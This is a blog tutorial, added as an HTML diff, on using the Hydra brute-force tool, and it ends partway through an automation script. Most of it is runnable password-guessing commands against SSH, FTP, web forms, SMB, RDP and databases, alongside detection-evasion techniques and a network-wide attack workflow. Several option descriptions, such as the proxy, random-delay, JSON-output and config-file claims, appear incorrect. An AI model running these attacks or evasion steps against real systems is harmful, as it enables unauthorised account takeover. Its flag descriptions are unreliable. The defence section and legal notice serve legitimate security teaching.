@@ -1,0 +1,1035 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hydra: Complete Guide to Brute Force Attack Tool | r3versein blog</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Custom Tailwind Config -->
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        primary: '#0f172a',
+                        secondary: '#8b5cf6',
+                        accent: '#ec4899',
+                    },
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                    },
+                }
+            }
+        }
+    </script>
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code&display=swap" rel="stylesheet">
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="../css/style.css">
+</head>
+<body class="bg-gray-50 font-sans dark-mode">
+    <!-- Navbar -->
+    <nav class="fixed w-full z-50 glass-effect">
+        <div class="container mx-auto px-4 py-4">
+            <div class="flex justify-between items-center">
+                <div class="flex items-center space-x-2">
+                    <a href="../index.html" class="flex items-center space-x-2">
+                        <div class="text-2xl font-bold bg-gradient-to-r from-accent to-secondary bg-clip-text text-transparent">r3versein</div>
+                        <span class="text-sm bg-gray-800 px-2 py-1 rounded-md">blog</span>
+                    </a>
+                </div>
+                <div class="hidden md:flex space-x-8">
+                    <a href="../index.html" class="hover:text-accent transition-colors relative group">
+                        Home
+                        <span class="absolute -bottom-1 left-0 w-0 h-0.5 bg-gradient-to-r from-accent to-secondary group-hover:w-full transition-all duration-300"></span>
+                    </a>
+                    <a href="../posts/index.html" class="hover:text-accent transition-colors relative group">
+                        Posts
+                        <span class="absolute -bottom-1 left-0 w-0 h-0.5 bg-gradient-to-r from-accent to-secondary group-hover:w-full transition-all duration-300"></span>
+                    </a>
+                    <a href="../index.html#about" class="hover:text-accent transition-colors relative group">
+                        About
+                        <span class="absolute -bottom-1 left-0 w-0 h-0.5 bg-gradient-to-r from-accent to-secondary group-hover:w-full transition-all duration-300"></span>
+                    </a>
+                </div>
+                <div class="md:hidden">
+                    <button id="menu-toggle" class="text-white focus:outline-none">
+                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"></path>
+                        </svg>
+                    </button>
+                </div>
+            </div>
+            <!-- Mobile Menu -->
+            <div id="mobile-menu" class="md:hidden hidden pt-4 pb-2 space-y-2">
+                <a href="../index.html" class="block py-2 hover:text-accent transition-colors">Home</a>
+                <a href="../posts/index.html" class="block py-2 hover:text-accent transition-colors">Posts</a>
+                <a href="../index.html#about" class="block py-2 hover:text-accent transition-colors">About</a>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Article Header -->
+    <header class="relative bg-primary py-32 overflow-hidden">
+        <div class="absolute inset-0 opacity-30">
+            <div class="absolute -top-24 -left-24 w-96 h-96 bg-accent rounded-full filter blur-3xl animate-pulse"></div>
+            <div class="absolute top-48 -right-24 w-96 h-96 bg-secondary rounded-full filter blur-3xl animate-pulse" style="animation-delay: 1s"></div>
+        </div>
+        <div class="container mx-auto px-4 relative z-10 pt-12">
+            <div class="max-w-3xl mx-auto text-center text-white">
+                <h1 class="text-4xl md:text-6xl font-bold mb-6 tracking-tight text-transparent bg-clip-text bg-gradient-to-r from-accent to-secondary">Hydra: Complete Guide to Brute Force Attack Tool</h1>
+                <div class="flex justify-center items-center text-sm mb-6 text-gray-300">
+                    <span>May 24, 2025</span>
+                    <span class="mx-2">•</span>
+                    <span>15 min read</span>
+                </div>
+                <div class="flex items-center justify-center">
+                    <span class="font-medium text-gray-300">Shaswata Roy</span>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Article Content -->
+    <main class="container mx-auto px-4 py-12 -mt-10">
+        <article class="max-w-3xl mx-auto bg-gray-800 p-8 rounded-xl shadow-lg glass-effect">
+            <div class="prose prose-lg max-w-none">
+                <p class="text-xl leading-relaxed text-gray-300 mb-6">
+                    Hydra is one of the most powerful and versatile password brute force tools available for penetration testers and security professionals. Developed by van Hauser, Hydra supports numerous protocols and services, making it an essential tool for testing authentication security. In this comprehensive guide, we'll explore everything you need to know about Hydra, from basic usage to advanced techniques.
+                </p>
+
+                <h2 class="text-2xl font-bold text-white mt-10 mb-4">What is Hydra?</h2>
+                <p class="mb-4">
+                    Hydra is a fast network logon cracker that supports many different services and protocols. It's designed to perform brute force attacks against various authentication services to test password security. The tool can perform rapid dictionary attacks against more than 50 protocols including telnet, ftp, http, https, smb, several databases, and much more.
+                </p>
+
+                <h3 class="text-xl font-semibold text-white mt-8 mb-4">Key Features of Hydra:</h3>
+                <ul class="list-disc pl-6 mb-6 space-y-2">
+                    <li><strong>Multi-Protocol Support</strong>: Works with over 50 protocols and services</li>
+                    <li><strong>Parallel Processing</strong>: Performs multiple concurrent connections</li>
+                    <li><strong>Flexible Input</strong>: Supports username/password lists and single credentials</li>
+                    <li><strong>Resume Capability</strong>: Can resume interrupted attacks</li>
+                    <li><strong>Custom Modules</strong>: Extensible with custom protocol modules</li>
+                    <li><strong>Cross-Platform</strong>: Available for Linux, Windows, and macOS</li>
+                </ul>
+
+                <h2 class="text-2xl font-bold text-white mt-10 mb-4">Installation and Setup</h2>
+                <p class="mb-4">
+                    Hydra comes pre-installed on most penetration testing distributions like Kali Linux and Parrot OS. For other systems, you can install it using package managers or compile from source.
+                </p>
+
+                <div class="bg-gray-900 text-gray-300 p-4 rounded-md mb-6 overflow-x-auto border border-gray-700">
+<pre><code># Ubuntu/Debian
+sudo apt-get install hydra
+
+# CentOS/RHEL/Fedora
+sudo yum install hydra
+# or
+sudo dnf install hydra
+
+# macOS (using Homebrew)
+brew install hydra
+
+# From source
+git clone https://github.com/vanhauser-thc/thc-hydra.git
+cd thc-hydra
+./configure
+make
+make install</code></pre>
+                </div>
+
+                <h2 class="text-2xl font-bold text-white mt-10 mb-4">Basic Hydra Syntax</h2>
+                <p class="mb-4">
+                    Understanding Hydra's syntax is crucial for effective usage. The basic command structure is:
+                </p>
+                <div class="bg-gray-900 text-gray-300 p-4 rounded-md mb-6 overflow-x-auto border border-gray-700">
+<pre><code>hydra [options] [service://]target[:port] [module-options]</code></pre>
+                </div>
+
+                <h3 class="text-xl font-semibold text-white mt-8 mb-4">Essential Options:</h3>
+                <ul class="list-disc pl-6 mb-6 space-y-2">
+                    <li><strong>-l username</strong>: Single username</li>
+                    <li><strong>-L userlist.txt</strong>: Username list file</li>
+                    <li><strong>-p password</strong>: Single password</li>
+                    <li><strong>-P passlist.txt</strong>: Password list file</li>
+                    <li><strong>-t threads</strong>: Number of parallel connections (default 16)</li>
+                    <li><strong>-s port</strong>: Custom port number</li>
+                    <li><strong>-v</strong>: Verbose output</li>
+                    <li><strong>-V</strong>: Very verbose (shows login attempts)</li>
+                    <li><strong>-f</strong>: Exit after first valid password found</li>
+                    <li><strong>-F</strong>: Exit after first valid username:password pair for any host</li>
+                </ul>
+
+                <h2 class="text-2xl font-bold text-white mt-10 mb-4">Common Attack Scenarios</h2>
+
+                <h3 class="text-xl font-semibold text-white mt-8 mb-4">1. SSH Brute Force Attack</h3>
+                <p class="mb-4">
+                    SSH is one of the most commonly targeted services. Here are various ways to attack SSH:
+                </p>
+                <div class="bg-gray-900 text-gray-300 p-4 rounded-md mb-6 overflow-x-auto border border-gray-700">
+<pre><code># Single username, single password
+hydra -l admin -p password 192.168.1.100 ssh
+
+# Single username, password list
+hydra -l admin -P passwords.txt 192.168.1.100 ssh
+
+# Username list, single password
+hydra -L usernames.txt -p password 192.168.1.100 ssh
+
+# Username list, password list
+hydra -L usernames.txt -P passwords.txt 192.168.1.100 ssh
+
+# With custom port and verbose output
+hydra -L users.txt -P pass.txt -t 4 -V 192.168.1.100 -s 2222 ssh
+
+# Stop after first successful login
+hydra -L users.txt -P pass.txt -f 192.168.1.100 ssh</code></pre>
+                </div>
+
+                <h3 class="text-xl font-semibold text-white mt-8 mb-4">2. FTP Brute Force Attack</h3>
+                <p class="mb-4">
+                    FTP services are also frequently targeted due to weak authentication:
+                </p>
+                <div class="bg-gray-900 text-gray-300 p-4 rounded-md mb-6 overflow-x-auto border border-gray-700">
+<pre><code># Basic FTP attack
+hydra -L users.txt -P passwords.txt 192.168.1.100 ftp
+
+# FTP with custom port
+hydra -L users.txt -P passwords.txt -s 2121 192.168.1.100 ftp
+
+# Anonymous FTP check
+hydra -l anonymous -p "" 192.168.1.100 ftp</code></pre>
+                </div>
+
+                <h3 class="text-xl font-semibold text-white mt-8 mb-4">3. HTTP/HTTPS Web Form Attacks</h3>
+                <p class="mb-4">
+                    Web applications with login forms can be targeted using Hydra's HTTP modules:
+                </p>
+                <div class="bg-gray-900 text-gray-300 p-4 rounded-md mb-6 overflow-x-auto border border-gray-700">
+<pre><code># HTTP POST form attack
+hydra -L users.txt -P pass.txt 192.168.1.100 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid login"
+
+# HTTPS POST form attack
+hydra -L users.txt -P pass.txt 192.168.1.100 https-post-form "/admin/login:user=^USER^&pass=^PASS^:Login failed"
+
+# HTTP GET form attack
+hydra -L users.txt -P pass.txt 192.168.1.100 http-get-form "/login:user=^USER^&password=^PASS^:Incorrect"
+
+# With cookies and custom headers
+hydra -L users.txt -P pass.txt 192.168.1.100 http-post-form "/login:username=^USER^&password=^PASS^:H=Cookie\: PHPSESSID=abc123:Invalid"</code></pre>
+                </div>
+
+                <h3 class="text-xl font-semibold text-white mt-8 mb-4">4. SMB/Windows Shares</h3>
+                <p class="mb-4">
+                    Windows SMB shares and services can be tested for weak passwords:
+                </p>
+                <div class="bg-gray-900 text-gray-300 p-4 rounded-md mb-6 overflow-x-auto border border-gray-700">
+<pre><code># SMB brute force
+hydra -L users.txt -P pass.txt 192.168.1.100 smb
+
+# RDP brute force
+hydra -L users.txt -P pass.txt 192.168.1.100 rdp
+
+# Windows RPC
+hydra -L users.txt -P pass.txt 192.168.1.100 rpc</code></pre>
+                </div>
+
+                <h3 class="text-xl font-semibold text-white mt-8 mb-4">5. Database Services</h3>
+                <p class="mb-4">
+                    Hydra supports various database protocols for authentication testing:
+                </p>
+                <div class="bg-gray-900 text-gray-300 p-4 rounded-md mb-6 overflow-x-auto border border-gray-700">
+<pre><code># MySQL database
+hydra -L users.txt -P pass.txt 192.168.1.100 mysql
+
+# PostgreSQL database
+hydra -L users.txt -P pass.txt 192.168.1.100 postgres
+
+# MSSQL database
+hydra -L users.txt -P pass.txt 192.168.1.100 mssql
+
+# Oracle database
+hydra -L users.txt -P pass.txt 192.168.1.100 oracle-listener</code></pre>
+                </div>
+
+                <h2 class="text-2xl font-bold text-white mt-10 mb-4">Advanced Hydra Techniques</h2>
+
+                <h3 class="text-xl font-semibold text-white mt-8 mb-4">1. Password Generation and Manipulation</h3>
+                <p class="mb-4">
+                    Hydra can work with generated passwords and apply transformations:
+                </p>
+                <div class="bg-gray-900 text-gray-300 p-4 rounded-md mb-6 overflow-x-auto border border-gray-700">
+<pre><code># Use generated passwords based on username
+hydra -L users.txt -e nsr 192.168.1.100 ssh
+# n = null password, s = username as password, r = reversed username
+
+# Combine multiple wordlists
+hydra -L users.txt -P pass1.txt -P pass2.txt 192.168.1.100 ssh
+
+# Use colon-separated format (username:password pairs)
+hydra -C combos.txt 192.168.1.100 ssh</code></pre>
+                </div>
+
+                <h3 class="text-xl font-semibold text-white mt-8 mb-4">2. Performance Optimization</h3>
+                <p class="mb-4">
+                    Optimize Hydra's performance based on your target and network conditions:
+                </p>
+                <div class="bg-gray-900 text-gray-300 p-4 rounded-md mb-6 overflow-x-auto border border-gray-700">
+<pre><code># Increase parallel connections (be careful not to overwhelm target)
+hydra -L users.txt -P pass.txt -t 64 192.168.1.100 ssh
+
+# Add wait time between connections (stealth)
+hydra -L users.txt -P pass.txt -w 3 192.168.1.100 ssh
+
+# Set connection timeout
+hydra -L users.txt -P pass.txt -W 30 192.168.1.100 ssh
+
+# Restore session from file
+hydra -R hydra.restore</code></pre>
+                </div>
+
+                <h3 class="text-xl font-semibold text-white mt-8 mb-4">3. Multiple Target Attacks</h3>
+                <p class="mb-4">
+                    Attack multiple targets simultaneously:
+                </p>
+                <div class="bg-gray-900 text-gray-300 p-4 rounded-md mb-6 overflow-x-auto border border-gray-700">
+<pre><code># Multiple IP addresses
+hydra -L users.txt -P pass.txt 192.168.1.100-110 ssh
+
+# Target list from file
+hydra -L users.txt -P pass.txt -M targets.txt ssh
+
+# CIDR notation
+hydra -L users.txt -P pass.txt 192.168.1.0/24 ssh</code></pre>
+                </div>
+
+                <h2 class="text-2xl font-bold text-white mt-10 mb-4">Creating Effective Wordlists</h2>
+                <p class="mb-4">
+                    The success of brute force attacks heavily depends on the quality of wordlists. Here are some strategies:
+                </p>
+
+                <h3 class="text-xl font-semibold text-white mt-8 mb-4">Popular Wordlist Sources:</h3>
+                <ul class="list-disc pl-6 mb-6 space-y-2">
+                    <li><strong>SecLists</strong>: Comprehensive collection of lists for security testing</li>
+                    <li><strong>RockYou.txt</strong>: Famous leaked password database</li>
+                    <li><strong>CrackStation</strong>: Large password dictionary</li>
+                    <li><strong>Probable Wordlists</strong>: Probability-ordered wordlists</li>
+                    <li><strong>Custom Lists</strong>: Target-specific passwords based on OSINT</li>
+                </ul>
+
+                <div class="bg-gray-900 text-gray-300 p-4 rounded-md mb-6 overflow-x-auto border border-gray-700">
+<pre><code># Create custom username list based on common patterns
+# Common usernames
+echo -e "admin\nadministrator\nroot\ntest\nguest\nuser" > users.txt
+
+# Company-specific usernames (if targeting specific organization)
+echo -e "jsmith\nj.smith\njohnsmith\nsmith\njohn" >> users.txt
+
+# Create password list with common patterns
+echo -e "password\nPassword123\nadmin\n123456\nqwerty" > passwords.txt</code></pre>
+                </div>
+
+                <h2 class="text-2xl font-bold text-white mt-10 mb-4">Hydra Modules and Protocol Support</h2>
+                <p class="mb-4">
+                    Hydra supports an extensive list of protocols and services. Here's a comprehensive list of supported modules:
+                </p>
+
+                <div class="bg-gray-900 p-6 rounded-lg mb-8 border border-gray-700">
+                    <h3 class="text-xl font-semibold mb-3 bg-gradient-to-r from-accent to-secondary bg-clip-text text-transparent">Supported Protocols</h3>
+                    <div class="grid grid-cols-2 md:grid-cols-3 gap-2 text-sm text-gray-300">
+                        <div>• ssh</div>
+                        <div>• ftp</div>
+                        <div>• http-get</div>
+                        <div>• http-post</div>
+                        <div>• https-get</div>
+                        <div>• https-post</div>
+                        <div>• telnet</div>
+                        <div>• smb</div>
+                        <div>• mysql</div>
+                        <div>• postgres</div>
+                        <div>• mssql</div>
+                        <div>• oracle</div>
+                        <div>• rdp</div>
+                        <div>• vnc</div>
+                        <div>• imap</div>
+                        <div>• pop3</div>
+                        <div>• smtp</div>
+                        <div>• snmp</div>
+                        <div>• ldap</div>
+                        <div>• rexec</div>
+                        <div>• rlogin</div>
+                        <div>• rsh</div>
+                        <div>• redis</div>
+                        <div>• cisco</div>
+                    </div>
+                </div>
+
+                <h2 class="text-2xl font-bold text-white mt-10 mb-4">Stealth and Evasion Techniques</h2>
+                <p class="mb-4">
+                    When performing penetration testing, it's important to avoid detection by security systems:
+                </p>
+
+                <h3 class="text-xl font-semibold text-white mt-8 mb-4">Rate Limiting and Delays:</h3>
+                <div class="bg-gray-900 text-gray-300 p-4 rounded-md mb-6 overflow-x-auto border border-gray-700">
+<pre><code># Slow attack to avoid detection
+hydra -L users.txt -P pass.txt -t 1 -w 10 192.168.1.100 ssh
+
+# Random delays between attempts
+hydra -L users.txt -P pass.txt -W 5-30 192.168.1.100 ssh</code></pre>
+                </div>
+
+                <h3 class="text-xl font-semibold text-white mt-8 mb-4">Proxy and Source IP Rotation:</h3>
+                <div class="bg-gray-900 text-gray-300 p-4 rounded-md mb-6 overflow-x-auto border border-gray-700">
+<pre><code># Use proxy server
+hydra -L users.txt -P pass.txt -S 192.168.1.100 ssh
+
+# Use specific source port
+hydra -L users.txt -P pass.txt -g 12345 192.168.1.100 ssh</code></pre>
+                </div>
+
+                <h2 class="text-2xl font-bold text-white mt-10 mb-4">Analyzing Results and Output</h2>
+                <p class="mb-4">
+                    Hydra provides various output options for analyzing results:
+                </p>
+                <div class="bg-gray-900 text-gray-300 p-4 rounded-md mb-6 overflow-x-auto border border-gray-700">
+<pre><code># Save output to file
+hydra -L users.txt -P pass.txt -o results.txt 192.168.1.100 ssh
+
+# JSON output format
+hydra -L users.txt -P pass.txt -b json 192.168.1.100 ssh
+
+# Show attempt details
+hydra -L users.txt -P pass.txt -V 192.168.1.100 ssh
+
+# Debug output
+hydra -L users.txt -P pass.txt -d 192.168.1.100 ssh</code></pre>
+                </div>
+
+                <h2 class="text-2xl font-bold text-white mt-10 mb-4">Common Errors and Troubleshooting</h2>
+                <p class="mb-4">
+                    Here are solutions to common Hydra issues:
+                </p>
+
+                <h3 class="text-xl font-semibold text-white mt-8 mb-4">Connection Issues:</h3>
+                <ul class="list-disc pl-6 mb-6 space-y-2">
+                    <li><strong>Too many connections</strong>: Reduce thread count with <code>-t</code></li>
+                    <li><strong>Connection timeouts</strong>: Increase timeout with <code>-W</code></li>
+                    <li><strong>Service detection failures</strong>: Verify target service and port</li>
+                    <li><strong>Rate limiting</strong>: Add delays with <code>-w</code> option</li>
+                </ul>
+
+                <h3 class="text-xl font-semibold text-white mt-8 mb-4">False Positives:</h3>
+                <div class="bg-gray-900 text-gray-300 p-4 rounded-md mb-6 overflow-x-auto border border-gray-700">
+<pre><code># Verify results manually
+ssh username@target -p port
+
+# Test with curl for web forms
+curl -d "username=found_user&password=found_pass" -X POST http://target/login</code></pre>
+                </div>
+
+                <h2 class="text-2xl font-bold text-white mt-10 mb-4">Defense Against Brute Force Attacks</h2>
+                <p class="mb-4">
+                    Understanding Hydra helps in implementing better defenses:
+                </p>
+
+                <h3 class="text-xl font-semibold text-white mt-8 mb-4">Defensive Measures:</h3>
+                <ul class="list-disc pl-6 mb-6 space-y-2">
+                    <li><strong>Account Lockout Policies</strong>: Lock accounts after failed attempts</li>
+                    <li><strong>Rate Limiting</strong>: Limit login attempts per IP/time period</li>
+                    <li><strong>Strong Password Policies</strong>: Enforce complex passwords</li>
+                    <li><strong>Multi-Factor Authentication</strong>: Add additional authentication layers</li>
+                    <li><strong>IP Whitelisting</strong>: Restrict access to known IP addresses</li>
+                    <li><strong>CAPTCHA Implementation</strong>: Add human verification</li>
+                    <li><strong>Monitoring and Alerting</strong>: Detect brute force attempts</li>
+                </ul>
+
+                <h2 class="text-2xl font-bold text-white mt-10 mb-4">Legal and Ethical Considerations</h2>
+                <div class="bg-red-900 bg-opacity-30 border border-red-500 p-6 rounded-lg mb-8">
+                    <h3 class="text-xl font-semibold mb-3 text-red-300">⚠️ Important Legal Notice</h3>
+                    <ul class="list-disc pl-6 space-y-2 text-red-200">
+                        <li>Only use Hydra on systems you own or have explicit written permission to test</li>
+                        <li>Unauthorized access to computer systems is illegal in most jurisdictions</li>
+                        <li>Always obtain proper authorization before conducting penetration tests</li>
+                        <li>Respect responsible disclosure practices for any vulnerabilities found</li>
+                        <li>Be aware of local laws and regulations regarding security testing</li>
+                    </ul>
+                </div>                <h2 class="text-2xl font-bold text-white mt-10 mb-4">Hydra vs Other Brute Force Tools</h2>
+                <p class="mb-4">
+                    Understanding how Hydra compares to other popular brute force tools helps in choosing the right tool for specific scenarios:
+                </p>
+
+                <div class="bg-gray-900 p-6 rounded-lg mb-8 border border-gray-700">
+                    <h3 class="text-xl font-semibold mb-4 bg-gradient-to-r from-accent to-secondary bg-clip-text text-transparent">Tool Comparison</h3>
+                    <div class="space-y-4">
+                        <div class="bg-gray-800 p-4 rounded-lg">
+                            <h4 class="font-semibold text-white mb-2">Hydra vs Medusa</h4>
+                            <ul class="list-disc pl-6 text-gray-300 space-y-1">
+                                <li><strong>Speed</strong>: Hydra is generally faster for most protocols</li>
+                                <li><strong>Protocol Support</strong>: Both support similar protocols, Hydra has slight edge</li>
+                                <li><strong>Memory Usage</strong>: Medusa is more memory efficient</li>
+                                <li><strong>Resume Capability</strong>: Medusa has better session resumption</li>
+                            </ul>
+                        </div>
+                        <div class="bg-gray-800 p-4 rounded-lg">
+                            <h4 class="font-semibold text-white mb-2">Hydra vs Ncrack</h4>
+                            <ul class="list-disc pl-6 text-gray-300 space-y-1">
+                                <li><strong>Network Efficiency</strong>: Ncrack better handles network optimization</li>
+                                <li><strong>Learning Capability</strong>: Ncrack can adapt timing based on responses</li>
+                                <li><strong>Protocol Support</strong>: Hydra supports more protocols</li>
+                                <li><strong>Ease of Use</strong>: Hydra has simpler command structure</li>
+                            </ul>
+                        </div>
+                        <div class="bg-gray-800 p-4 rounded-lg">
+                            <h4 class="font-semibold text-white mb-2">Hydra vs John the Ripper</h4>
+                            <ul class="list-disc pl-6 text-gray-300 space-y-1">
+                                <li><strong>Purpose</strong>: John focuses on hash cracking, Hydra on network services</li>
+                                <li><strong>Speed</strong>: John is faster for offline attacks</li>
+                                <li><strong>Wordlist Rules</strong>: John has more sophisticated wordlist manipulation</li>
+                                <li><strong>Network Attacks</strong>: Hydra excels in online network attacks</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <h2 class="text-2xl font-bold text-white mt-10 mb-4">Real-World Penetration Testing Scenarios</h2>
+                <p class="mb-4">
+                    Here are practical examples of how Hydra is used in real penetration testing engagements:
+                </p>
+
+                <h3 class="text-xl font-semibold text-white mt-8 mb-4">Scenario 1: Corporate Network Assessment</h3>
+                <div class="bg-gray-900 text-gray-300 p-4 rounded-md mb-6 overflow-x-auto border border-gray-700">
+<pre><code># Step 1: Discover live hosts and services
+nmap -sn 192.168.1.0/24 > live_hosts.txt
+nmap -sS -p 22,21,23,80,443,139,445,3389 -iL live_hosts.txt -oG service_scan.txt
+
+# Step 2: Extract targets with specific services
+grep "22/open" service_scan.txt | awk '{print $2}' > ssh_targets.txt
+grep "21/open" service_scan.txt | awk '{print $2}' > ftp_targets.txt
+
+# Step 3: Create targeted username lists based on organization
+echo -e "admin\nadministrator\nroot\nservice\nbackup" > admin_users.txt
+echo -e "jsmith\nj.smith\njohnsmith\nmjohnson\nwilliams" > common_users.txt
+
+# Step 4: Execute systematic brute force
+hydra -L admin_users.txt -P /usr/share/wordlists/rockyou.txt -M ssh_targets.txt ssh -t 4 -w 3
+hydra -L common_users.txt -P /usr/share/wordlists/common-passwords.txt -M ftp_targets.txt ftp -t 2 -w 5</code></pre>
+                </div>
+
+                <h3 class="text-xl font-semibold text-white mt-8 mb-4">Scenario 2: Web Application Assessment</h3>
+                <div class="bg-gray-900 text-gray-300 p-4 rounded-md mb-6 overflow-x-auto border border-gray-700">
+<pre><code># Identify login forms with Burp Suite or manual inspection
+# Test default credentials first
+hydra -L default_users.txt -P default_passwords.txt example.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"
+
+# Test with common passwords
+hydra -l admin -P common_passwords.txt example.com http-post-form "/admin/login:user=^USER^&pass=^PASS^&submit=Login:Login failed"
+
+# HTTPS login form with session handling
+hydra -l user@example.com -P passwords.txt example.com https-post-form "/secure/login:email=^USER^&password=^PASS^:Authentication failed" -V</code></pre>
+                </div>
+
+                <h3 class="text-xl font-semibold text-white mt-8 mb-4">Scenario 3: Database Server Assessment</h3>
+                <div class="bg-gray-900 text-gray-300 p-4 rounded-md mb-6 overflow-x-auto border border-gray-700">
+<pre><code># MySQL brute force with common database usernames
+hydra -L db_users.txt -P db_passwords.txt 192.168.1.100 mysql
+
+# PostgreSQL with specific database
+hydra -L users.txt -P passwords.txt postgres://192.168.1.101/testdb
+
+# SQL Server authentication
+hydra -L users.txt -P passwords.txt 192.168.1.102 mssql
+
+# Oracle database testing
+hydra -L oracle_users.txt -P oracle_passwords.txt 192.168.1.103 oracle-listener</code></pre>
+                </div>
+
+                <h2 class="text-2xl font-bold text-white mt-10 mb-4">Advanced Configuration and Customization</h2>
+                <p class="mb-4">
+                    For advanced users, Hydra offers extensive customization options through configuration files and environment variables:
+                </p>
+
+                <h3 class="text-xl font-semibold text-white mt-8 mb-4">Custom Module Development</h3>
+                <div class="bg-gray-900 text-gray-300 p-4 rounded-md mb-6 overflow-x-auto border border-gray-700">
+<pre><code># Hydra module structure (C code example for custom protocol)
+#include "hydra-mod.h"
+
+extern void service_custom(char *ip, int sp, unsigned char options, char *miscptr, FILE * fp) {
+    // Custom protocol implementation
+    // Handle authentication logic
+    // Return results to Hydra core
+}
+
+# Compile custom module
+gcc -shared -fPIC -o hydra-custom.so hydra-custom.c</code></pre>
+                </div>
+
+                <h3 class="text-xl font-semibold text-white mt-8 mb-4">Configuration Files</h3>
+                <div class="bg-gray-900 text-gray-300 p-4 rounded-md mb-6 overflow-x-auto border border-gray-700">
+<pre><code># ~/.hydra/hydra.conf
+# Global Hydra configuration
+
+# Default threading
+default_threads=16
+
+# Default timeouts
+default_timeout=30
+default_connect_timeout=5
+
+# Default retry count
+default_retry=3
+
+# Logging preferences
+log_level=2
+log_file=/var/log/hydra.log</code></pre>
+                </div>
+
+                <h2 class="text-2xl font-bold text-white mt-10 mb-4">Performance Tuning and Optimization</h2>
+                <p class="mb-4">
+                    Optimizing Hydra performance requires understanding both the tool and the target environment:
+                </p>
+
+                <h3 class="text-xl font-semibold text-white mt-8 mb-4">Network-Based Optimizations</h3>
+                <div class="bg-gray-900 text-gray-300 p-4 rounded-md mb-6 overflow-x-auto border border-gray-700">
+<pre><code># High-speed local network (adjust threads based on network capacity)
+hydra -L users.txt -P pass.txt -t 64 192.168.1.100 ssh
+
+# Remote target with limited bandwidth
+hydra -L users.txt -P pass.txt -t 4 -w 2 remote.example.com ssh
+
+# Optimize for specific protocols
+# SSH: Use fewer threads (4-16) due to connection overhead
+# HTTP: Can handle more threads (32-64) if server allows
+# FTP: Medium threads (8-32) depending on server configuration
+
+# Memory optimization for large wordlists
+# Use -x for generating passwords instead of large files
+hydra -L users.txt -x 6:8:a1 192.168.1.100 ssh  # 6-8 chars, letters+numbers</code></pre>
+                </div>
+
+                <h3 class="text-xl font-semibold text-white mt-8 mb-4">Target-Specific Optimizations</h3>
+                <div class="bg-gray-900 text-gray-300 p-4 rounded-md mb-6 overflow-x-auto border border-gray-700">
+<pre><code># Windows targets (often more restrictive)
+hydra -L users.txt -P pass.txt -t 8 -w 3 192.168.1.100 rdp
+
+# Linux SSH servers (can usually handle more connections)
+hydra -L users.txt -P pass.txt -t 32 -w 1 192.168.1.101 ssh
+
+# Web applications (check for rate limiting)
+hydra -l admin -P pass.txt -t 16 -w 2 example.com http-post-form "/login:user=^USER^&pass=^PASS^:failed"
+
+# Database servers (typically handle fewer concurrent connections)
+hydra -L users.txt -P pass.txt -t 4 -w 5 192.168.1.102 mysql</code></pre>
+                </div>
+
+                <h2 class="text-2xl font-bold text-white mt-10 mb-4">Detecting and Bypassing Security Measures</h2>
+                <p class="mb-4">
+                    Modern systems implement various security measures to prevent brute force attacks. Understanding these helps in both penetration testing and defense:
+                </p>
+
+                <h3 class="text-xl font-semibold text-white mt-8 mb-4">Common Detection Methods</h3>
+                <ul class="list-disc pl-6 mb-6 space-y-2">
+                    <li><strong>Rate Limiting</strong>: Restricts attempts per time period</li>
+                    <li><strong>Account Lockouts</strong>: Locks accounts after failed attempts</li>
+                    <li><strong>IP Blocking</strong>: Blocks source IP addresses</li>
+                    <li><strong>CAPTCHA</strong>: Requires human verification</li>
+                    <li><strong>Behavioral Analysis</strong>: Detects automated patterns</li>
+                    <li><strong>Honeypots</strong>: Fake services to detect attackers</li>
+                </ul>
+
+                <h3 class="text-xl font-semibold text-white mt-8 mb-4">Evasion Techniques</h3>
+                <div class="bg-gray-900 text-gray-300 p-4 rounded-md mb-6 overflow-x-auto border border-gray-700">
+<pre><code># Distribute attacks across multiple IPs (requires proxy setup)
+hydra -L users.txt -P pass.txt -M targets.txt -T 192.168.1.1-255 ssh
+
+# Use very slow attacks to avoid rate detection
+hydra -L users.txt -P pass.txt -t 1 -w 60 192.168.1.100 ssh
+
+# Randomize user/password order to avoid patterns
+hydra -L users.txt -P pass.txt -u 192.168.1.100 ssh
+
+# Use realistic user agents for web attacks
+hydra -L users.txt -P pass.txt -m "User-Agent: Mozilla/5.0..." example.com http-post-form "/login:..."
+
+# Split wordlists to avoid triggering thresholds
+split -l 100 passwords.txt pass_chunk_
+for chunk in pass_chunk_*; do
+    hydra -L users.txt -P $chunk -t 1 -w 300 192.168.1.100 ssh
+    sleep 3600  # Wait 1 hour between chunks
+done</code></pre>
+                </div>
+
+                <h2 class="text-2xl font-bold text-white mt-10 mb-4">Scripting and Automation Integration</h2>
+                <p class="mb-4">
+                    Integrating Hydra into automated workflows and scripts enhances its effectiveness in larger assessments:
+                </p>
+
+                <h3 class="text-xl font-semibold text-white mt-8 mb-4">Bash Automation Scripts</h3>
+                <div class="bg-gray-900 text-gray-300 p-4 rounded-md mb-6 overflow-x-auto border border-gray-700">
+<pre><code>#!/bin/bash
+# automated_hydra.sh - Comprehensive Hydra automation script
+
+# Configuration
+TARGET_LIST="targets.txt"
+USER_LIST="users.txt"
+PASS_LIST="passwords.txt"
+OUTPUT_DIR="hydra_results"
+LOG_FILE="hydra_scan.log"
+
+# Create output directory
+mkdir -p $OUTPUT_DIR
+
+# Function to log messages
+log_message() {
+    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a $LOG_FILE
+}
+
+# Function to test SSH
+test_ssh() {
+    local target=$1
+    log_message "Testing SSH on $target"
